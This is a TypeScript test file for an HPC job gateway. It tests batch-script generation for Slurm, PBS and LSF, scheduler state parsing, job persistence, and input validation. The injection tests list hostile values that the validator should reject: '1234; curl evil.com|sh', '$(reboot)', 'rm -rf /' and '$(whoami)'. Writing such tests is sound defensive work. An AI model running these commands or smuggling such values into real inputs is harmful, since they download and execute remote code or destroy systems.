/**
 * CSLab 超算网关测试
 *
 * 覆盖：统一计算契约转译、调度器状态归一化、JSON 解析、
 * 作业上下文持久化与「重启后重水合仍可读」。
 */

import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { CsLabLab } from '@profer/shared'

let rootDir = ''
let lab: CsLabLab

const UUID = '550e8400-e29b-41d4-0000-000000000000'

beforeAll(async () => {
  rootDir = mkdtempSync(join(tmpdir(), 'cslab-hpc-'))
  process.env.PROFER_CONFIG_DIR = rootDir
  const { createLab } = await import('./cslab-manager')
  lab = createLab({ name: '超算测试实验室', description: '自动化测试' })
})

afterAll(async () => {
  const { stopAllHpcBridges } = await import('./cslab-hpc')
  const { closeAllHpcDatabases } = await import('./cslab-hpc-db')
  const { closeAllCsLabDatabases } = await import('./cslab-db')
  await stopAllHpcBridges()
  closeAllHpcDatabases()
  closeAllCsLabDatabases()
  try {
    rmSync(rootDir, { recursive: true, force: true })
  } catch {
    // Windows 句柄延迟释放。
  }
})

describe('统一计算契约转译', () => {
  const contract = {
    nodes: 2,
    coresPerNode: 16,
    walltimeHours: 48,
    memoryGb: 128,
    gpus: 2,
    gpuType: 'a100',
    queue: 'gpu',
    command: 'module load vasp && mpirun -np 32 vasp_std',
  }

  test('Slurm：SBATCH 指令与确定性 UUID 作业名', async () => {
    const { synthesizeBatchScript } = await import('./cslab-hpc')
    const { script, schedulerJobName } = synthesizeBatchScript(
      { scheduler: 'slurm', remoteWorkDir: '/scratch/user/project' },
      contract,
      UUID,
    )
    expect(schedulerJobName).toBe('cslab-550e8400')
    expect(script).toContain('#SBATCH --job-name=cslab-550e8400')
    expect(script).toContain('#SBATCH --nodes=2')
    expect(script).toContain('#SBATCH --ntasks-per-node=16')
    expect(script).toContain('#SBATCH --time=48:00:00')
    expect(script).toContain('#SBATCH --mem=128G')
    expect(script).toContain('#SBATCH --gres=gpu:a100:2')
    expect(script).toContain('#SBATCH -p gpu')
    expect(script).toContain("cd '/scratch/user/project'")
    expect(script).toContain('mpirun -np 32 vasp_std')
  })

  test('PBS：select 资源行与 walltime', async () => {
    const { synthesizeBatchScript } = await import('./cslab-hpc')
    const { script } = synthesizeBatchScript(
      { scheduler: 'pbs', remoteWorkDir: '/home/u/proj' },
      contract,
      UUID,
    )
    expect(script).toContain('#PBS -N cslab-550e8400')
    expect(script).toContain('#PBS -l select=2:ncpus=16:ngpus=2:mem=128gb')
    expect(script).toContain('#PBS -l walltime=48:00:00')
    expect(script).toContain('#PBS -q gpu')
  })

  test('LSF：总核数、span 与 GPU 独占', async () => {
    const { synthesizeBatchScript } = await import('./cslab-hpc')
    const { script } = synthesizeBatchScript(
      { scheduler: 'lsf', remoteWorkDir: '/home/u/proj' },
      contract,
      UUID,
    )
    expect(script).toContain('#BSUB -J cslab-550e8400')
    expect(script).toContain('#BSUB -n 32')
    expect(script).toContain('#BSUB -R "span[ptile=16]"')
    expect(script).toContain('#BSUB -W 48:00')
    expect(script).toContain('#BSUB -M 128G')
    expect(script).toContain('#BSUB -gpu "num=2:mode=exclusive_process"')
  })

  test('队列名与 GPU 型号拒绝换行与 shell 控制字符', async () => {
    const { synthesizeBatchScript } = await import('./cslab-hpc')
    const profile = { scheduler: 'slurm' as const, remoteWorkDir: '/scratch/user/project' }

    expect(() =>
      synthesizeBatchScript(profile, { ...contract, queue: 'gpu\n#SBATCH --export=ALL' }, UUID),
    ).toThrow('队列分区名')

    expect(() =>
      synthesizeBatchScript(profile, { ...contract, gpuType: 'a100\nrm -rf /' }, UUID),
    ).toThrow('GPU 型号')

    expect(() =>
      synthesizeBatchScript(profile, { ...contract, queue: 'gpu$(whoami)' }, UUID),
    ).toThrow('队列分区名')
  })
})

describe('调度器状态归一化', () => {
  test('Slurm / PBS / LSF 常见状态', async () => {
    const { normalizeSchedulerState } = await import('./cslab-hpc')
    expect(normalizeSchedulerState('PD', 'slurm')).toBe('PENDING')
    expect(normalizeSchedulerState('RUNNING', 'slurm')).toBe('RUNNING')
    expect(normalizeSchedulerState('COMPLETED', 'slurm')).toBe('COMPLETED')
    expect(normalizeSchedulerState('TIMEOUT', 'slurm')).toBe('TIMEOUT')
    expect(normalizeSchedulerState('CANCELLED by 1001', 'slurm')).toBe('CANCELLED')

    expect(normalizeSchedulerState('Q', 'pbs')).toBe('PENDING')
    expect(normalizeSchedulerState('R', 'pbs')).toBe('RUNNING')
    expect(normalizeSchedulerState('C', 'pbs')).toBe('COMPLETED')
    expect(normalizeSchedulerState('F', 'pbs')).toBe('FAILED')

    expect(normalizeSchedulerState('PEND', 'lsf')).toBe('PENDING')
    expect(normalizeSchedulerState('RUN', 'lsf')).toBe('RUNNING')
    expect(normalizeSchedulerState('DONE', 'lsf')).toBe('COMPLETED')
    expect(normalizeSchedulerState('EXIT', 'lsf')).toBe('FAILED')
    expect(normalizeSchedulerState('???', 'lsf')).toBe('UNKNOWN')
  })
})

describe('调度器 JSON 解析', () => {
  test('sacct --json', async () => {
    const { parseSchedulerJson } = await import('./cslab-hpc')
    const parsed = parseSchedulerJson(
      'slurm',
      JSON.stringify({
        jobs: [{ job_id: 998244, state: { current: ['COMPLETED'] } }],
      }),
    )
    expect(parsed[0]).toEqual({ jobId: '998244', rawState: 'COMPLETED' })
  })

  test('qstat -Fjson', async () => {
    const { parseSchedulerJson } = await import('./cslab-hpc')
    const parsed = parseSchedulerJson(
      'pbs',
      JSON.stringify({ Jobs: { '998.aurora': { job_state: 'R' } } }),
    )
    expect(parsed).toEqual([{ jobId: '998', rawState: 'R' }])
  })

  test('bjobs -json', async () => {
    const { parseSchedulerJson } = await import('./cslab-hpc')
    const parsed = parseSchedulerJson(
      'lsf',
      JSON.stringify({ records: [{ JOBID: '7788', STAT: 'DONE' }] }),
    )
    expect(parsed).toEqual([{ jobId: '7788', rawState: 'DONE' }])
  })

  test('Slurm 纯文本兜底与空输入', async () => {
    const { parseSchedulerJson } = await import('./cslab-hpc')
    expect(parseSchedulerJson('slurm', '998244|PENDING\n998245|RUNNING')).toEqual([
      { jobId: '998244', rawState: 'PENDING' },
      { jobId: '998245', rawState: 'RUNNING' },
    ])
    expect(parseSchedulerJson('slurm', '')).toEqual([])
    expect(parseSchedulerJson('pbs', 'not-json')).toEqual([])
  })
})

describe('作业上下文持久化与重水合基础', () => {
  test('提交前落盘、关闭数据库后仍可读取（模拟重启）', async () => {
    const { __saveJobRowForTest, listHpcJobs, __findJobByRemoteIdForTest } = await import(
      './cslab-hpc'
    )
    const { closeAllHpcDatabases } = await import('./cslab-hpc-db')

    __saveJobRowForTest({
      key: 'job-test-1',
      labId: lab.id,
      profileId: 'hpc-test',
      jobId: '998244',
      jobName: 'cslab-550e8400',
      uuid: UUID,
      state: 'PENDING',
      remoteWorkDir: '/scratch/user/project',
      submittedAt: Date.now() - 60_000,
      lastCheckedAt: Date.now() - 60_000,
      artifacts: [],
    })

    let jobs = listHpcJobs(lab.id)
    expect(jobs).toHaveLength(1)
    expect(jobs[0]?.jobId).toBe('998244')

    // 模拟应用重启：关闭连接后重新打开同一个 sqlite 文件。
    closeAllHpcDatabases()
    jobs = listHpcJobs(lab.id)
    expect(jobs).toHaveLength(1)
    expect(jobs[0]?.state).toBe('PENDING')
    expect(__findJobByRemoteIdForTest(lab.id, '998244')?.key).toBe('job-test-1')
  })

  test('终态作业不再进入重水合候选', async () => {
    const { __saveJobRowForTest } = await import('./cslab-hpc')
    const { listActiveHpcJobRows } = await import('./cslab-hpc-db')
    const { getHpcDatabase } = await import('./cslab-hpc-db')

    __saveJobRowForTest({
      key: 'job-test-2',
      labId: lab.id,
      profileId: 'hpc-test',
      jobId: '998245',
      jobName: 'cslab-550e8401',
      uuid: '550e8401-0000-0000-0000-000000000000',
      state: 'COMPLETED',
      remoteWorkDir: '/scratch/user/project',
      submittedAt: Date.now(),
      artifacts: [],
    })

    const active = listActiveHpcJobRows(getHpcDatabase(lab.id), lab.id)
    expect(active.some((row) => row.key === 'job-test-2')).toBe(false)
    expect(active.some((row) => row.key === 'job-test-1')).toBe(true)
  })

  test('未知 MFA 请求返回 false，不抛异常', async () => {
    const { answerHpcMfa } = await import('./cslab-hpc')
    expect(answerHpcMfa('mfa-not-exist', '123456')).toBe(false)
  })
})

describe('远程 JobID 白名单', () => {
  test('合法调度器 JobID 原样通过', async () => {
    const { assertSafeRemoteJobId } = await import('./cslab-hpc')
    expect(assertSafeRemoteJobId('12345')).toBe('12345')
    expect(assertSafeRemoteJobId('1234.server')).toBe('1234.server')
    expect(assertSafeRemoteJobId('1234_7')).toBe('1234_7')
    expect(assertSafeRemoteJobId('cslab-1a2b3c4d')).toBe('cslab-1a2b3c4d')
  })

  test('命令注入与非法字符被阻断', async () => {
    const { assertSafeRemoteJobId } = await import('./cslab-hpc')
    const malicious = [
      '1234; curl evil.com|sh',
      '`id`',
      '$(reboot)',
      '1234 5678',
      '1234\n5678',
      'a'.repeat(65),
      '',
    ]
    for (const value of malicious) {
      expect(() => assertSafeRemoteJobId(value)).toThrow('远程 JobID 格式非法')
    }
  })
})
